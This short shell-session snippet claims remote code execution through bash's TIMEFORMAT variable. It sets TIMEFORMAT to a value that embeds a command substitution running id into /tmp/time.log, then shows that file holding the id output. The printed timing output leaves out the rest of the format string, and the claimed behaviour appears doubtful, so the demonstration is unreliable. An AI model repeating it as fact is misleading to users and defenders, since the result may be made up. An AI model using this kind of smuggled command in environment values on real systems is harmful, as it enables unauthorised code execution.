```sh -cwn
$ # TIMEFORMAT - RCE via time builtin
$ TIMEFORMAT=$'real\t%R\n$(id>/tmp/time.log)'
$ time sleep 0.01
real	0.012
$ cat /tmp/time.log
uid=1000(mistrale) gid=1000(mistrale) groups=1000(mistrale)
```


